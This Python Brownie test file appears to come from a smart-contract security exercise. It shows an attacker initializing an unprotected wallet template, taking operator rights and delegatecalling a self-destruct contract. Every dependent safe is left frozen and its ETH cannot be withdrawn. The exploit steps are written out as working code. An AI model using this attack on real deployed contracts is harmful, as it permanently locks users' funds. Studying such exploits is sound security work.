from scripts.call4_helper import *
from brownie import reverts
import web3


def test_call4_exploit():

        # Block Safe operation works
    with reverts('Not an operator'):
        blockSafe1.addOperator(user2, {'from': user2, 'gas_price': 0x4133110a0})

        # executeWithValue fails
    with reverts('Not an operator'):
        blockSafe1.executeWithValue(user2, b'', Wei('1 ether'), {'from': user2, 'gas_price': 0x4133110a0})

        # execute fails
    calldata = token.balanceOf.encode_input(deployer)
    with reverts('Not an operator'):
        blockSafe1.execute(token, calldata, CALL_OPERATION,{'from': user2, 'gas_price': 0x4133110a0})

    attackerInitialBalance = attacker.balance()

    # Exploit
    destructor = BlockSafeDestructor.deploy({'from': attacker, 'gas_price': 0x4133110a0})
    blockSafeTemplate.initialize([attacker.address], {'from': attacker, 'gas_price': 0x4133110a0})
    blockSafeTemplate.execute(destructor, b'', DELEGATECALL_OPERATION, {'from': attacker, 'gas_price': 0x4133110a0})

    # Check if exploit worked
    # All safes should be non functional and frozen
    # And we can't withdraw ETH from the safes

    safe1BalanceBefore = blockSafe1.balance()
    blockSafe1.executeWithValue(user1.address, b'', Wei('10 ether'), {'from': user1, 'gas_price': 0x4133110a0})
    assert(safe1BalanceBefore == blockSafe1.balance())

    safe2BalanceBefore = blockSafe2.balance()
    blockSafe2.executeWithValue(user2.address, b'', Wei('10 ether'), {'from': user2, 'gas_price': 0x4133110a0})
    assert(safe2BalanceBefore == blockSafe2.balance())

    safe3BalanceBefore = blockSafe3.balance()
    blockSafe3.executeWithValue(user3.address, b'', Wei('10 ether'), {'from': user3, 'gas_price': 0x4133110a0})
    assert(safe3BalanceBefore == blockSafe3.balance())
